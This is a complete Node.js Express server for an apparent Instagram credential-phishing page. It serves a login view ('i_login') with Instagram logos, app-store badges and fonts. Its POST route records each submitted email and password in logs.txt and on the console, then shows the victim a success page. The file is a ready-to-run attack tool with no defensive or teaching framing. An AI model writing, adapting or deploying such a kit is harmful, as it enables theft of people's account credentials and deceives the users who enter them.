const express = require('express');
const exphbs = require('express-handlebars');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const os = require('os');
var port = process.env.PORT || 1111;
var networkInterfaces = os.networkInterfaces();

const app = express();

app.engine('handlebars', exphbs({ defaultLayout: 'main' }));
app.set('view engine', 'handlebars');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use('/images', express.static('images'));

app.get('/', function (req, res) {
    res.render('i_login');
});

app.post('/_', function (req, res) {
    res.render('i_success');
    var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`
    fs.appendFile('logs.txt', captured_content, err => {
        if (err) {
            console.error(err)
            return
        }
    });
    console.log(captured_content);
});

app.get('/images/applestore.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/applestore.png'))
});
app.get('/images/facebook-icon.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/facebook-icon.png'))
});
app.get('/images/favicon.ico', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/favicon.ico'))
});
app.get('/images/googlestore.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/googlestore.png'))
});
app.get('/images/instagram-logo.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/instagram-logo.png'))
});
app.get('/images/phones.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/phones.png'))
});
app.get('/fonts/segoe-ui-bold.ttf', function (req, res) {
    res.sendFile(path.join(__dirname, './views/fonts/segoe-ui-bold.ttf'))
});
app.get('/fonts/segoe-ui-regular.ttf', function (req, res) {
    res.sendFile(path.join(__dirname, './views/fonts/segoe-ui-regular.ttf'))
});

app.listen(port, () => {
    console.log(`[!] Server Running! ${port}`)
});

